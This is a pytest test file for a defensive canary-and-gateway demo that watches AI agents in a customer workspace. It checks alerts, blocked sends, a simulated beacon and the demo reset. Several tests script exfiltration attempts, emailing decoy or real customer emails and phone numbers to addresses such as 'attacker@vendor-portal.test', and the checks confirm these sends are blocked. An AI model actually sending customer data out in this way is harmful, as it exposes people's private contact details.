"""Checks: alerts, the beacon simulation and the demo reset."""

import csv
import json

import pytest
import requests
from fastapi.testclient import TestClient

from backend import alerts, audit, config, database, gateway, seeder, sessions
from scripts import generate_workspace as generator

ADMIN_TOKEN = "stage14-admin-token-6d2c"


def admin(token=ADMIN_TOKEN):
    return {"X-Admin-Token": token}


@pytest.fixture()
def world(tmp_path, monkeypatch):
    root = tmp_path / "workspace"
    monkeypatch.setattr(config, "WORKSPACE_DIR", root)
    monkeypatch.setattr(config, "ADMIN_TOKEN", ADMIN_TOKEN)
    monkeypatch.setattr(config, "TELEGRAM_BOT_TOKEN", "")
    monkeypatch.setattr(config, "TELEGRAM_CHAT_ID", "")
    generator.generate(root)
    seeder.seed()
    database.init_app_db()
    run = database.create_demo_run(notes="alert tests")

    canaries = seeder.list_registered_canaries()
    decoy = next(c for c in canaries if c.canary_type == "customer")
    decoy_emails = {
        c.strong_values()[0] for c in canaries if c.canary_type == "customer"
    }
    with (root / "customers" / "customer_contacts.csv").open(
        newline="", encoding="utf-8"
    ) as handle:
        rows = list(csv.DictReader(handle))
    real = [row for row in rows if row["email"] not in decoy_emails]

    return {
        "run_id": run.run_id,
        "decoy": decoy,
        "decoy_email": decoy.strong_values()[0],
        "customer_a": real[0],
        "customer_b": real[1],
    }


@pytest.fixture()
def client(world):
    from backend.main import app

    with TestClient(app) as test_client:
        yield test_client


def session_for(world, mode="protect", authorised=(), agent="claude"):
    return database.create_session(
        run_id=world["run_id"],
        agent_mode=agent,
        protection_mode=mode,
        task_context={"authorised_recipients": list(authorised)},
    )


# ---------------------------------------------------------------------------
# A quarantined read
# ---------------------------------------------------------------------------


def test_a_quarantined_read_raises_a_plain_english_alert(world):
    session = session_for(world)
    gateway.execute(
        session.session_id, "read_file", {"path": "customers/customer_contacts.csv"}
    )

    alert = database.list_alerts(run_id=world["run_id"])[0]

    assert alert.severity == "critical"
    assert alert.title == "A decoy record was read"
    assert "customer_contacts.csv" in alert.message
    assert "paused" in alert.message


def test_the_quarantine_alert_names_the_agent(world):
    session = session_for(world, agent="worst_case")
    gateway.execute(
        session.session_id, "read_file", {"path": "customers/customer_contacts.csv"}
    )

    alert = database.list_alerts(run_id=world["run_id"])[0]

    assert "Worst-case (scripted)" in alert.message


def test_the_quarantine_alert_offers_stop_and_continue(world):
    session = session_for(world)
    gateway.execute(
        session.session_id, "read_file", {"path": "customers/customer_contacts.csv"}
    )

    described = alerts.list_alerts(world["run_id"])[0]

    assert described["actions"] == ["stop", "continue"]
    assert described["session_status"] == "paused"


def test_the_quarantine_alert_carries_no_file_contents(world):
    session = session_for(world)
    gateway.execute(
        session.session_id, "read_file", {"path": "customers/customer_contacts.csv"}
    )

    alert = database.list_alerts(run_id=world["run_id"])[0]

    assert "@example" not in alert.message
    assert "+65" not in alert.message
    assert world["decoy_email"] not in alert.message


def test_an_alert_records_the_decoy_ids_not_their_values(world):
    session = session_for(world)
    gateway.execute(
        session.session_id, "read_file", {"path": "customers/customer_contacts.csv"}
    )

    alert = database.list_alerts(run_id=world["run_id"])[0]

    assert json.loads(alert.canary_ids)
    assert world["decoy_email"] not in (alert.canary_ids or "")


# ---------------------------------------------------------------------------
# A blocked send
# ---------------------------------------------------------------------------


def test_a_blocked_send_alert_names_the_destination_and_the_file(world):
    session = session_for(world)
    gateway.execute(
        session.session_id,
        "send_email",
        {
            "recipient": "attacker@vendor-portal.test",
            "subject": "list",
            "body": world["decoy_email"],
        },
    )

    alert = database.list_alerts(run_id=world["run_id"])[0]

    assert "attacker@vendor-portal.test" in alert.message
    assert "customer_contacts.csv" in alert.message
    assert "Nothing was sent" in alert.message
    assert "terminated" in alert.message


def test_a_blocked_send_alert_carries_no_contents(world):
    session = session_for(world)
    gateway.execute(
        session.session_id,
        "send_email",
        {"recipient": "x@vendor-portal.test", "subject": "s", "body": world["decoy_email"]},
    )

    alert = database.list_alerts(run_id=world["run_id"])[0]

    assert world["decoy_email"] not in alert.message


def test_a_terminated_session_offers_no_actions(world):
    session = session_for(world)
    gateway.execute(
        session.session_id,
        "send_email",
        {"recipient": "x@vendor-portal.test", "subject": "s", "body": world["decoy_email"]},
    )

    described = alerts.list_alerts(world["run_id"])[0]

    assert described["actions"] == []
    assert described["session_status"] == "terminated"


def test_a_bulk_block_raises_its_own_alert(world):
    session = session_for(world)
    with (config.WORKSPACE_DIR / "customers" / "customer_contacts.csv").open(
        newline="", encoding="utf-8"
    ) as handle:
        rows = list(csv.DictReader(handle))
    body = " ".join(row["email"] for row in rows[:6])

    gateway.execute(
        session.session_id,
        "send_email",
        {"recipient": "bulk@crm-switch.test", "subject": "list", "body": body},
    )

    alert = database.list_alerts(run_id=world["run_id"])[0]
    assert alert.title == "A bulk disclosure was blocked"
    assert "Nothing was sent" in alert.message


# ---------------------------------------------------------------------------
# Alerts come only from backend events, and can be resolved
# ---------------------------------------------------------------------------


def test_an_ordinary_run_raises_no_alert(world):
    session = session_for(world, authorised=("someone@example.com",))
    gateway.execute(session.session_id, "find_order", {"order_number": 1042})
    gateway.execute(
        session.session_id,
        "send_email",
        {"recipient": "someone@example.com", "subject": "Re", "body": "It has shipped."},
    )

    assert database.list_alerts(run_id=world["run_id"]) == []


def test_an_alert_can_be_marked_resolved(client, world):
    session = session_for(world)
    gateway.execute(
        session.session_id, "read_file", {"path": "customers/customer_contacts.csv"}
    )
    alert_id = database.list_alerts(run_id=world["run_id"])[0].id

    body = client.post(f"/api/alerts/{alert_id}/resolve", headers=admin()).json()

    assert body["status"] == "resolved"


def test_resolving_an_alert_is_audited(client, world):
    session = session_for(world)
    gateway.execute(
        session.session_id, "read_file", {"path": "customers/customer_contacts.csv"}
    )
    alert_id = database.list_alerts(run_id=world["run_id"])[0].id
    client.post(f"/api/alerts/{alert_id}/resolve", headers=admin())

    events = database.list_audit_events(run_id=world["run_id"])

    assert any(event.event_type == "ADMIN_RESOLVE_ALERT" for event in events)


def test_resolving_needs_the_admin_token(client, world):
    session = session_for(world)
    gateway.execute(
        session.session_id, "read_file", {"path": "customers/customer_contacts.csv"}
    )
    alert_id = database.list_alerts(run_id=world["run_id"])[0].id

    assert client.post(f"/api/alerts/{alert_id}/resolve").status_code == 401


def test_resolving_an_unknown_alert_returns_404(client):
    assert client.post("/api/alerts/9999/resolve", headers=admin()).status_code == 404


def test_every_alert_is_labelled_simulated(client, world):
    session = session_for(world)
    gateway.execute(
        session.session_id, "read_file", {"path": "customers/customer_contacts.csv"}
    )

    body = client.get(f"/api/alerts?run_id={world['run_id']}").json()

    assert body["count"] == 1
    assert body["alerts"][0]["simulated"] is True


# ---------------------------------------------------------------------------
# The optional Telegram relay
# ---------------------------------------------------------------------------


def test_telegram_is_off_unless_both_values_are_set(world, monkeypatch):
    monkeypatch.setattr(config, "TELEGRAM_BOT_TOKEN", "bot-token")
    monkeypatch.setattr(config, "TELEGRAM_CHAT_ID", "")

    assert alerts.telegram_configured() is False
    assert alerts.send_to_telegram("t", "m") is False


def test_telegram_sends_the_same_text(world, monkeypatch):
    sent = {}

    class FakeResponse:
        status_code = 200

    def fake_post(url, json=None, timeout=None):
        sent["url"] = url
        sent["json"] = json
        return FakeResponse()

    monkeypatch.setattr(config, "TELEGRAM_BOT_TOKEN", "bot-token")
    monkeypatch.setattr(config, "TELEGRAM_CHAT_ID", "chat-1")
    monkeypatch.setattr(requests, "post", fake_post)

    session = session_for(world)
    gateway.execute(
        session.session_id, "read_file", {"path": "customers/customer_contacts.csv"}
    )

    alert = database.list_alerts(run_id=world["run_id"])[0]
    assert "sendMessage" in sent["url"]
    assert sent["json"]["chat_id"] == "chat-1"
    assert alert.title in sent["json"]["text"]
    assert alert.message in sent["json"]["text"]


def test_a_telegram_failure_keeps_the_in_app_alert(world, monkeypatch, caplog):
    def fake_post(url, json=None, timeout=None):
        raise requests.ConnectionError(f"could not reach {url}")

    monkeypatch.setattr(config, "TELEGRAM_BOT_TOKEN", "secret-bot-token")
    monkeypatch.setattr(config, "TELEGRAM_CHAT_ID", "chat-1")
    monkeypatch.setattr(requests, "post", fake_post)

    with caplog.at_level("WARNING"):
        session = session_for(world)
        gateway.execute(
            session.session_id, "read_file", {"path": "customers/customer_contacts.csv"}
        )

    assert len(database.list_alerts(run_id=world["run_id"])) == 1
    logged = " ".join(record.getMessage() for record in caplog.records)
    assert "secret-bot-token" not in logged


def test_the_bot_token_is_never_in_an_alert(world, monkeypatch):
    class FakeResponse:
        status_code = 200

    monkeypatch.setattr(config, "TELEGRAM_BOT_TOKEN", "secret-bot-token")
    monkeypatch.setattr(config, "TELEGRAM_CHAT_ID", "chat-1")
    monkeypatch.setattr(requests, "post", lambda *a, **k: FakeResponse())

    session = session_for(world)
    gateway.execute(
        session.session_id, "read_file", {"path": "customers/customer_contacts.csv"}
    )

    alert = database.list_alerts(run_id=world["run_id"])[0]
    assert "secret-bot-token" not in alert.message


# ---------------------------------------------------------------------------
# The beacon simulation
# ---------------------------------------------------------------------------


def test_the_beacon_names_the_file_the_decoy_only_existed_in(client, world):
    canary = world["decoy"]

    body = client.post(f"/api/beacon/{canary.id}", headers=admin()).json()

    assert body["location"] == canary.location
    assert body["simulated"] is True


def test_the_beacon_alert_says_the_file_has_leaked(client, world):
    canary = world["decoy"]
    client.post(f"/api/beacon/{canary.id}", headers=admin())

    alert = database.list_alerts()[0]

    assert "contacted a decoy" in alert.message
    assert canary.location in alert.message
    assert "leaked" in alert.message
    assert "simulated" in alert.message.lower()


def test_the_beacon_is_audited(client, world):
    canary = world["decoy"]
    client.post(f"/api/beacon/{canary.id}", headers=admin())

    events = [
        event
        for event in database.list_audit_events()
        if event.event_type == "BEACON_SIMULATED"
    ]

    assert len(events) == 1
    assert events[0].resource == canary.location


def test_the_beacon_needs_the_admin_token(client, world):
    assert client.post(f"/api/beacon/{world['decoy'].id}").status_code == 401


def test_an_unknown_decoy_returns_404(client):
    assert client.post("/api/beacon/not-a-decoy", headers=admin()).status_code == 404


def test_the_beacon_endpoint_is_absent_when_demo_mode_is_off(world, monkeypatch):
    import importlib

    monkeypatch.setattr(config, "DEMO_MODE", False)
    from backend import main as main_module

    reloaded = importlib.reload(main_module)
    try:
        paths = {route.path for route in reloaded.app.routes}
        assert "/api/beacon/{canary_id}" not in paths
    finally:
        monkeypatch.setattr(config, "DEMO_MODE", True)
        importlib.reload(main_module)


# ---------------------------------------------------------------------------
# Reset
# ---------------------------------------------------------------------------


def test_reset_starts_a_new_run(client, world):
    body = client.post("/api/reset", headers=admin()).json()

    assert body["run_id"] != world["run_id"]
    assert body["previous_run_id"] == world["run_id"]
    assert database.get_active_demo_run().run_id == body["run_id"]


def test_reset_keeps_the_earlier_run_and_its_evidence(client, world):
    session = session_for(world)
    gateway.execute(
        session.session_id, "read_file", {"path": "customers/customer_contacts.csv"}
    )
    before = len(database.list_audit_events(run_id=world["run_id"]))

    client.post("/api/reset", headers=admin())

    after = len(database.list_audit_events(run_id=world["run_id"]))
    assert after >= before
    assert database.get_demo_run(world["run_id"]) is not None
    assert world["run_id"] in [run.run_id for run in database.list_demo_runs()]


def test_reset_terminates_open_sessions_and_clears_pending_state(client, world):
    session = session_for(world)
    database.save_conversation_state(session.session_id, {"messages": [{"role": "user"}]})

    body = client.post("/api/reset", headers=admin()).json()

    updated = database.get_session(session.session_id)
    assert body["sessions_terminated"] >= 1
    assert updated.status == "terminated"
    assert updated.conversation_state() == {}


def test_reset_denies_messages_still_held(client, world):
    session = session_for(world, authorised=(world["customer_a"]["email"],))
    result = gateway.execute(
        session.session_id,
        "send_email",
        {
            "recipient": world["customer_a"]["email"],
            "subject": "number",
            "body": f"It is {world['customer_b']['phone']}.",
        },
    )
    assert result["decision"] == "held"

    body = client.post("/api/reset", headers=admin()).json()

    assert body["held_emails_denied"] == 1
    assert database.get_simulated_email(result["email_id"]).delivery_status == "denied"


def test_reset_resolves_open_alerts(client, world):
    session = session_for(world)
    gateway.execute(
        session.session_id, "read_file", {"path": "customers/customer_contacts.csv"}
    )

    body = client.post("/api/reset", headers=admin()).json()

    assert body["alerts_resolved"] == 1
    assert database.list_alerts(run_id=world["run_id"], status="open") == []


def test_reset_unseeds_and_restores_the_workspace(client, world):
    assert seeder.is_seeded() is True

    body = client.post("/api/reset", headers=admin()).json()

    assert body["canaries_removed"] == 20
    assert seeder.is_seeded() is False
    with (config.WORKSPACE_DIR / "customers" / "customer_contacts.csv").open(
        newline="", encoding="utf-8"
    ) as handle:
        assert len(list(csv.DictReader(handle))) == 200


def test_reset_never_deletes_a_source_file(client, world):
    before = sorted(
        path.name for path in config.WORKSPACE_DIR.rglob("*") if path.is_file()
    )

    client.post("/api/reset", headers=admin())

    after = sorted(
        path.name for path in config.WORKSPACE_DIR.rglob("*") if path.is_file()
    )
    # Only the planted decoy document goes; everything generated stays.
    assert set(before) - set(after) <= {"supplier_terms_2026.txt"}


def test_the_new_run_starts_a_fresh_chain(client, world):
    session = session_for(world)
    gateway.execute(session.session_id, "find_order", {"order_number": 1042})

    body = client.post("/api/reset", headers=admin()).json()

    events = database.list_audit_events(run_id=body["run_id"])
    assert events[0].previous_hash == "GENESIS"
    assert events[0].event_type == "RUN_STARTED"
    assert audit.verify_audit_chain(body["run_id"])["valid"] is True


def test_both_chains_stay_valid_after_a_reset(client, world):
    session = session_for(world)
    gateway.execute(
        session.session_id, "read_file", {"path": "customers/customer_contacts.csv"}
    )

    body = client.post("/api/reset", headers=admin()).json()

    assert audit.verify_audit_chain(world["run_id"])["valid"] is True
    assert audit.verify_audit_chain(body["run_id"])["valid"] is True


def test_reset_records_itself_in_the_old_runs_chain(client, world):
    body = client.post("/api/reset", headers=admin()).json()

    events = database.list_audit_events(run_id=body["previous_run_id"])

    assert any(event.event_type == "RUN_RESET" for event in events)


def test_reset_needs_the_admin_token(client, world):
    assert client.post("/api/reset").status_code == 401
    assert database.get_active_demo_run().run_id == world["run_id"]


def test_reset_leaves_suite_results_attributable_to_their_run(client, world):
    suite_run = database.create_test_run(
        agent_mode="worst_case", protection_mode="protect", demo_run_id=world["run_id"]
    )
    database.create_test_result(
        run_id=suite_run.run_id,
        scenario_id="B1",
        scenario_type="attack",
        category="bulk",
    )

    client.post("/api/reset", headers=admin())

    kept = database.get_test_run(suite_run.run_id)
    assert kept is not None
    assert kept.demo_run_id == world["run_id"]
    assert len(database.list_test_results(suite_run.run_id)) == 1


def test_reset_can_run_twice_in_a_row(client, world):
    first = client.post("/api/reset", headers=admin()).json()
    second = client.post("/api/reset", headers=admin()).json()

    assert second["previous_run_id"] == first["run_id"]
    assert len({world["run_id"], first["run_id"], second["run_id"]}) == 3
    assert len(database.list_demo_runs()) == 3


def test_a_relay_that_misbehaves_cannot_break_the_security_path(world, monkeypatch):
    """The alert is what matters; mirroring it is best-effort.

    A relay that returns something unexpected, or raises something that is not
    a requests error, must not propagate into the gateway call that is
    quarantining a read.
    """
    monkeypatch.setattr(config, "TELEGRAM_BOT_TOKEN", "bot-token")
    monkeypatch.setattr(config, "TELEGRAM_CHAT_ID", "chat-1")
    monkeypatch.setattr(requests, "post", lambda *a, **k: None)

    session = session_for(world)
    result = gateway.execute(
        session.session_id, "read_file", {"path": "customers/customer_contacts.csv"}
    )

    assert result["decision"] == "quarantined"
    assert len(database.list_alerts(run_id=world["run_id"])) == 1


def test_a_relay_raising_an_arbitrary_error_is_contained(world, monkeypatch):
    def explode(*args, **kwargs):
        raise RuntimeError("something unexpected")

    monkeypatch.setattr(config, "TELEGRAM_BOT_TOKEN", "bot-token")
    monkeypatch.setattr(config, "TELEGRAM_CHAT_ID", "chat-1")
    monkeypatch.setattr(requests, "post", explode)

    assert alerts.send_to_telegram("title", "message") is False
